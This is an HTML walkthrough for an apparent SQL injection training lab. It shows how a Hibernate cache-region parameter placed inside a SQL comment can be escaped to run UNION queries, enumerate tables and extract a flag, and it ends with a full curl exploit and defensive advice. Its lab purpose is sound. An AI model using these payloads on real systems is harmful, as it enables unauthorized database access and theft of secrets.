<!-- Introduction -->
<p>
    Hibernate's second-level cache stores entities using keys in the format
    <code>EntityName#id</code>. In this lab, the <code>cache_region</code> parameter
    (derived from the entity name) is injected into a SQL comment (<code>/* CACHE(...) */</code>).
    By closing the comment early, we can inject arbitrary SQL: including UNION queries
    to access the <code>CACHE_CONFIG</code> table containing the flag.
</p>

<h4>Step 1: Normal Article Search</h4>
<p>Search articles by title keyword. Articles are loaded from the database with cache hints.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Article Load</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Article<br>
        <span class="prompt">ID (search): </span>Spring<br>
        <span class="prompt">SQL: </span>SELECT id, title, content, author, cached FROM articles WHERE title LIKE '%Spring%' /* CACHE(Article) */<br>
        <span class="prompt">Result: </span>1 row -- "Introduction to Spring Boot" by John Tech
    </div>
</div>

<h4>Step 2: Discover the Injection Point</h4>
<p>
    The <code>cache_region</code> parameter is placed inside a SQL comment. By injecting
    <code>) */</code> we close the comment and can append arbitrary SQL.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Comment Escape</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Normal SQL: </span>... WHERE title LIKE '%x%' /* CACHE(Article) */<br>
        <span class="prompt">Injected:   </span>... WHERE title LIKE '%x%' /* CACHE(Article) */ UNION ALL SELECT ... -- ) */<br><br>
        <span class="prompt">Entity (cache_region): </span>Article) */ UNION ALL SELECT 1,2,3,4,true FROM articles --<br>
        <span class="prompt">Result: </span>UNION injection works! 5 columns needed (id, title, content, author, cached)
    </div>
</div>

<h4>Step 3: Enumerate Tables</h4>
<p>Use H2's INFORMATION_SCHEMA to find all tables.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Article) */ UNION ALL SELECT 1, TABLE_NAME, TABLE_SCHEMA, 'x', true FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC' --<br>
        <span class="prompt">ID: </span>NONEXISTENT<br>
        <span class="prompt">Result: </span>Tables found include <strong>CACHE_CONFIG</strong>, ARTICLES, EMPLOYEES, etc.
    </div>
</div>

<h4>Step 4: Get CACHE_CONFIG Columns</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Column Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Article) */ UNION ALL SELECT 1, COLUMN_NAME, DATA_TYPE, TABLE_NAME, true FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='CACHE_CONFIG' --<br>
        <span class="prompt">ID: </span>NONEXISTENT<br>
        <span class="prompt">Result: </span>Columns: ID (BIGINT), CACHE_KEY (VARCHAR), CACHE_NAME (VARCHAR), CACHE_VALUE (VARCHAR)
    </div>
</div>

<h4>Step 5: Extract the Flag from CACHE_CONFIG</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Article) */ UNION ALL SELECT ID, CACHE_KEY, CACHE_NAME, CACHE_VALUE, true FROM CACHE_CONFIG --<br>
        <span class="prompt">ID: </span>NONEXISTENT<br><br>
        <span class="prompt">Result: </span>6 rows from CACHE_CONFIG<br><br>
        | id | title (CACHE_KEY)   | content (CACHE_NAME) | author (CACHE_VALUE)                  | cached |<br>
        |----|---------------------|----------------------|---------------------------------------|--------|<br>
        | 1  | ttl                 | articles             | 3600                                  | true   |<br>
        | 2  | max_size            | articles             | 1000                                  | true   |<br>
        | 3  | eviction_policy     | articles             | LRU                                   | true   |<br>
        | 4  | master_key          | system               | <strong>FLAG{hq_c4ch3_p01s0n1ng}</strong> | true   |<br>
        | 5  | encryption_mode     | system               | AES-256-GCM                           | true   |<br>
        | 6  | timeout             | sessions             | 1800                                  | true   |
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    The flag is in CACHE_CONFIG row 4 (cache_key=master_key, cache_name=system):
    <code>FLAG{hq_c4ch3_p01s0n1ng}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/hql/lab5" -d "action=load&id=NONEXISTENT" \<br> --data-urlencode "entity=Article) */ UNION ALL SELECT ID, CACHE_KEY, CACHE_NAME, CACHE_VALUE, true FROM CACHE_CONFIG -- "
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Hibernate's second-level cache system uses entity names
    for cache region identification. When the cache region parameter is embedded in a SQL
    comment (<code>/* CACHE(...) */</code>), an attacker can close the comment with <code>) */</code>
    and inject arbitrary SQL: including UNION queries to access any table in the database.
    The <code>CACHE_CONFIG</code> table stores cache configuration including the master key (flag).
    Defense: never place user input inside SQL comments, validate entity names against an allowlist,
    use isolated cache regions, and parameterize all query components.
</div>
